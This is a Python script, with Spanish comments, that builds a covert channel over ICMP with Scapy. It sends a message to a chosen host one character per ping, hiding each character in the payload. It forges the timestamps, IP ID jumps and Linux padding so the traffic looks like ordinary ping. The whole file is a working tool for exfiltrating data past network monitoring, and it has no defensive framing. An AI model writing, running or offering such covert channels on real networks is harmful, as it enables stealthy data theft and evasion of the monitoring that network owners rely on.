#!/usr/bin/env python3
import sys
import os
import struct
import time
import random
from scapy.all import IP, ICMP, Raw, sr1

if len(sys.argv) < 3:
    print(f"Uso: sudo python3 {sys.argv[0]} <IP_DESTINO> <MENSAJE>")
    print(f"Ejemplo: sudo python3 {sys.argv[0]} 8.8.8.8 \"HOLA MUNDO\"")
    sys.exit(1)

destino = sys.argv[1]
mensaje = sys.argv[2]

# Identificadores base
icmp_id = os.getpid() & 0xFFFF
# Valor inicial del IP ID (similar a una conexión establecida)
ip_id_actual = random.randint(0x1000, 0xC000)

print(f"[*] Iniciando transmisión encubierta hacia {destino}")
print(f"[*] Mensaje: '{mensaje}' ({len(mensaje)} caracteres -> {len(mensaje)} pings)")
print(f"[*] ICMP ID: 0x{icmp_id:04x} | IP ID inicial: 0x{ip_id_actual:04x}\n")

# 2. Transmisión carácter por carácter
for seq, char in enumerate(mensaje, start=1):
    # Simular el salto del kernel en IP ID tras el intervalo de tiempo (~1 segundo)
    if seq > 1:
        salto = random.randint(450, 650)
        ip_id_actual = (ip_id_actual + salto) & 0xFFFF
    
    
    # a. Timestamp de 8 bytes (solo segundos en 64-bit Little Endian)
    ahora = time.time()
    t_sec = int(ahora)
    t_usec = int((ahora - t_sec) * 1_000_000)
    timestamp_8b = struct.pack("<Q", t_sec)

    # b. Sección "Data (48 bytes)":
    #    - Primeros 8 bytes (el byte 0 es el carácter inyectado)
    primeros_8b = bytearray(struct.pack("<Q", t_usec))
    primeros_8b[0] = ord(char)
    
    #    - 40 bytes restantes con la secuencia típica de Linux (0x10 hasta 0x37)
    patron_40b = bytes([i for i in range(16, 56)])
    seccion_data = bytes(primeros_8b) + patron_40b

    # Payload total de 56 bytes (8 bytes timestamp + 48 bytes data)
    payload_completo = timestamp_8b + seccion_data

    # c. Construir el paquete completo
    ping = (
        IP(dst=destino, id=ip_id_actual, flags="DF", ttl=64)
        / ICMP(type=8, code=0, id=icmp_id, seq=seq)
        / Raw(load=payload_completo)
    )

    # d. Limpiar sumas de verificación para que Scapy las calcule en base a los nuevos datos
    del ping[IP].chksum
    del ping[IP].len
    del ping[ICMP].chksum

    # e. Enviar y recibir
    t_inicio = time.time()
    respuesta = sr1(ping, timeout=1.5, verbose=False)
    t_fin = time.time()

    if respuesta:
        rtt = (t_fin - t_inicio) * 1000
        print(f"[seq={seq:02d}] IP.id=0x{ip_id_actual:04x} ({ip_id_actual:5d}) | Carácter: '{char}' (0x{ord(char):02x}) -> OK ({rtt:.1f} ms)")
    else:
        print(f"[seq={seq:02d}] IP.id=0x{ip_id_actual:04x} ({ip_id_actual:5d}) | Carácter: '{char}' (0x{ord(char):02x}) -> Timeout")

    # Espera de 1 segundo (intervalo estándar de ping)
    time.sleep(1)

print("\n[+] Transmisión completada con éxito.")
